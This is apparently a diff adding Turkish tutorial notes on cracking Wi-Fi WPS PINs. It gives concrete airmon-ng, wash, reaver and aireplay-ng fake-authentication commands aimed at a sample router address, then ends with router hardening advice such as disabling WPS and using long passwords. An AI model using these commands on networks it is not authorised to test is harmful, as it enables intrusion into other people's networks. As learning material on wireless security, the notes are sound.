@@ -1,0 +1,41 @@
+	WPS YÖNTEMİ
+ Neredeyse hiçbir modemde güvenliklerin arttırılması sebebiyle çalışmıyor.
+ Bu yöntemi kullanmana gerek yoktur ve sadece bilgi amaçlı yazılmıştır.
+
+airmon-ng start wlan0
+wash -i wlan0mon	-> WPS'i Etkin olan tüm cihazları görmemizi sağlar.
+			-> Neredeyse herkesde etkin ama muhtemelen bir çoğu kullanmıyor.
+
+
+ Reaver: WPS Kırmak için kullanılan bir araç.
+reaver --bssid 88:41:FC:19:B4:5B --channel 1 -i wlan0mon	-> reaver, kendi içindeki PIN Wordlisti ile şifreleri denemeye başlayacak.
+
+ Failed to associate with 88:41:FC:19:B4:5B -> Bu hatayı çözmek için fakeauth kullanacağız.
+ 
+ Yeni bir terminalden:
+aireplay-ng --fakeauth 60 -a 88:41:FC:19:B4:5B -h 6C:60:EB:24:F8:09 wlan0mon	
+	-> -h = ifconfig -> unspec olarak gözüken ilk 6 hane AA-BB (- olan yerlere : koy.)
+	-> --fakeauth Komutunu kullandıktan sonra tekrardan reaver başlatacağız.
+
+reaver --bssid 88:41:FC:19:B4:5B --channel 1 -i wlan0mon -A	-> associate'ı ben halledeceğim.
+
+	-> -vvv: Yapılan tüm işlemleri gösterir.
+	-> -A:	 Associate'i bana bırak.
+
+
+
+
+	GÜVENLİ BİR MODEME SAHİP OLMAK
+
+-Yetkisizlendirme Saldırıları
+   *802.11 w
+
+-MAC Filtrelemesi kullanmamak
+
+-Gizli ağ kullanmamak
+
+-Gereksiz WPS Kullanımlarını elemek
+
+-ARP Saldırıları filtrelerini aktif etmek
+
+-Kompleks ve uzun şifreler
